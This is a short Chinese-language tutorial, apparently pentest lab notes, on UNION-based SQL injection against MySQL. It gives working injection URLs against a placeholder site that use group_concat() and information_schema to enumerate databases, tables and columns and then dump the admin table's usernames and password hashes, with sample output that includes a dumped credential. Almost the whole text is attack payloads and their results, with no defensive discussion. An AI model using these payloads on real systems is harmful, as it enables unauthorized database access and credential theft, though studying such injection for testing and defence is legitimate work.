函数 group_concat()可以将查询的字段的数据查询出来,可以用利这个函数 将mysql所有的库名查询出来

## 1、查询所有的库

```http
http://target_sys.com/article.php?id=-1 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1
http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA 
```

information_schema,blogs,mysql,performance_schema,target_sys,test,wordpress

## 2、查询库里所有的表

```http
http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()
```

admin,article,moon_range,users

## 3、查询表里所有的字段

```http
http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e
```

需要把表名转成16进制

id,username,password

## 4、查询数据

```http
http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(username,0x3a,password) from admin
```

admin:e10adc3949ba59abbe56e057f20f883e

## 5、查询失败的原因

这种方面不是通用的，有时候 查询不全 这个原因是字段的大小问题。解决办法 换一个字段查询，或者 用函数查询长度再用字符串函数截取。这种方法将会在下面介绍。